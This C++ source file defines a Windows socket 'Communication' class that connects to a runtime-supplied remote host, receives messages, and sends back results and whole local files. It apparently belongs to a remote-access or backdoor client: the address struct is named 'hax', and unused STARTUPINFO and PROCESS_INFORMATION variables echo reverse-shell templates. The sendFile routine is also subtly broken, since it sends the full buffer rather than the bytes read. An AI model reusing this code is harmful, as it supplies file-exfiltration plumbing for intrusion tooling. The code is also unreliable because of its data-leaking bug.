#include "Communication.h"
#include <iostream>
#include <stdexcept>

Communication::Communication(char* ip, short port) {
    _ip = ip;
    _port = port;
    _sock = INVALID_SOCKET;
    connect();
}

Communication::~Communication() {
    if (_sock != INVALID_SOCKET) {
        closesocket(_sock);
    }

    WSACleanup();
}

bool Communication::connect() {
    SOCKET wSock;
    WSADATA wsaData;
    struct sockaddr_in hax;
    STARTUPINFO sui;
    PROCESS_INFORMATION pi;

    _sock = INVALID_SOCKET;

    // init socket lib
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed.\n");
        return false;
    }

    // create socket
    wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (wSock == INVALID_SOCKET) {
        fprintf(stderr, "WSASocket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return false;
    }

    hax.sin_family = AF_INET;
    hax.sin_port = htons(_port);

    // Convert IP address to wide string
    WCHAR wIp[INET_ADDRSTRLEN];
    if (MultiByteToWideChar(CP_ACP, 0, _ip, -1, wIp, INET_ADDRSTRLEN) == 0) {
        fprintf(stderr, "MultiByteToWideChar failed with error: %ld\n", GetLastError());
        closesocket(wSock);
        WSACleanup();
        return false;
    }

    // Use InetPton instead of inet_addr
    if (InetPton(AF_INET, wIp, &hax.sin_addr) <= 0) {
        fprintf(stderr, "InetPton failed with error: %ld\n", WSAGetLastError());
        closesocket(wSock);
        WSACleanup();
        return false;
    }

    // connect to remote host
    if (WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        fprintf(stderr, "WSAConnect failed with error: %ld\n", WSAGetLastError());
        closesocket(wSock);
        WSACleanup();
        return false;
    }

    _sock = wSock;

    return true;
}

string Communication::getMsg() {
    char buffer[1024];
    int bytesReceived = recv(_sock, buffer, sizeof(buffer) - 1, 0);
    if (bytesReceived == SOCKET_ERROR || bytesReceived == 0) {
        throw std::runtime_error("Error receiving data");
    }
    buffer[bytesReceived] = '\0';
    return string(buffer);
}

void Communication::sendMsg(const std::string& results) {
    // Calculate the total message length
    size_t totalLength = LENGTH + results.size();

    // Create a vector to hold the entire message
    std::vector<char> msg(totalLength);

    // Convert the size of results to a 4-byte integer
    int size = static_cast<int>(results.size());

    // Copy the size to the first 4 bytes of msg (in network byte order)
    msg[0] = (size >> 24) & 0xFF;
    msg[1] = (size >> 16) & 0xFF;
    msg[2] = (size >> 8) & 0xFF;
    msg[3] = size & 0xFF;

    // Copy the results string to msg after the size
    std::memcpy(msg.data() + LENGTH, results.c_str(), results.size());

    // Send the complete message
    int bytesSent = send(_sock, msg.data(), totalLength, 0);
    if (bytesSent == SOCKET_ERROR) {
        throw std::runtime_error("Error sending data");
    }
}

void Communication::sendFile(const string& filename) {
    std::ifstream file(filename, ios::in | ios::binary);
    if (!file) {
        throw std::runtime_error("Error open file");
    }

    char buffer[BUFFER_SIZE];
    while (!file.eof()) {
        file.read(buffer, BUFFER_SIZE);
        std::streamsize bytesRead = file.gcount();
        if (send(_sock, buffer, BUFFER_SIZE, 0) == -1) {
            file.close();
            throw std::runtime_error("Error sending data");
        }
    }
    sendMsg("end");

    file.close();
}
